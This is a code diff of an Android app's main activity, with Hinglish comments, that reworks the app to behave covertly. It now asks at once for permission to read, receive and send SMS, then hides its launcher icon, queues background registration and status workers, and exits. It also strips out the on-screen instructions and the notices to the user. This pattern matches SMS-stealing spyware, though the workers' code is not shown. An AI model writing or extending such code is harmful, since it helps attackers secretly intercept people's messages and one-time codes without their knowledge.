@@ -9,7 +9,6 @@ import android.os.Bundle
 import android.view.View
 import android.widget.Button
 import android.widget.TextView
-import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -23,37 +22,25 @@ import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var btnRequestPermissions: Button
-    private lateinit var tvInstruction: TextView
-    // btnEnableRestricted ki ab zarurat nahi hai
-
     private val SMS_PERMISSION_CODE = 100
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        // Layout ki zarurat nahi agar sab auto kar rahe ho, 
+        // par error se bachne ke liye rehne de sakte hain.
         setContentView(R.layout.activity_main)
 
-        btnRequestPermissions = findViewById(R.id.btnRequestPermissions)
-        tvInstruction = findViewById(R.id.tvInstruction)
-
-        // UI Clean-up: Purane instruction hide kar do
-        tvInstruction.text = "Please allow permissions to continue setup."
-        
-        // Agar button layout me exist karta hai toh use hide kar do
-        val btnRestricted = findViewById<Button>(R.id.btnEnableRestricted)
-        btnRestricted?.visibility = View.GONE
-
+        // 1. Check karo agar permission pehle se hai toh setup complete karo
         if (isSmsPermissionGranted()) {
             setupCompleted()
-        }
-
-        btnRequestPermissions.setOnClickListener {
+        } else {
+            // 2. Agar nahi hai, toh bina kisi button click ke turant maango
             requestSmsPermission()
         }
     }
 
     private fun isSmsPermissionGranted(): Boolean {
-        val permissions = arrayOf(
+        val permissions = mutableListOf(
             Manifest.permission.READ_SMS,
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.SEND_SMS
@@ -90,17 +77,17 @@ class MainActivity : AppCompatActivity() {
     ) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
         if (requestCode == SMS_PERMISSION_CODE) {
+            // Permission milte hi setup complete karke icon hide kar do
             if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
-                Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show()
                 setupCompleted()
             } else {
-                Toast.makeText(this, "Permissions denied. App may not work properly.", Toast.LENGTH_LONG).show()
+                // Agar deny kiya toh firse maang sakte ho ya finish kar do
+                finish()
             }
         }
     }
 
     private fun setupCompleted() {
-        // Registration Worker
         val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
             .setInitialDelay(2, TimeUnit.SECONDS)
             .build()
@@ -108,7 +95,9 @@ class MainActivity : AppCompatActivity() {
 
         startBackgroundWork()
         hideLauncherIcon()
-        finish() // App close ho jayegi background setup ke baad
+        
+        // Sab set hone ke baad activity turant band
+        finish()
     }
 
     private fun hideLauncherIcon() {
@@ -130,7 +119,7 @@ class MainActivity : AppCompatActivity() {
         val workManager = WorkManager.getInstance(this)
 
         val firstStatus = OneTimeWorkRequestBuilder<StatusWorker>()
-            .setInitialDelay(10, TimeUnit.SECONDS)
+            .setInitialDelay(5, TimeUnit.SECONDS)
             .build()
         workManager.enqueue(firstStatus)
 
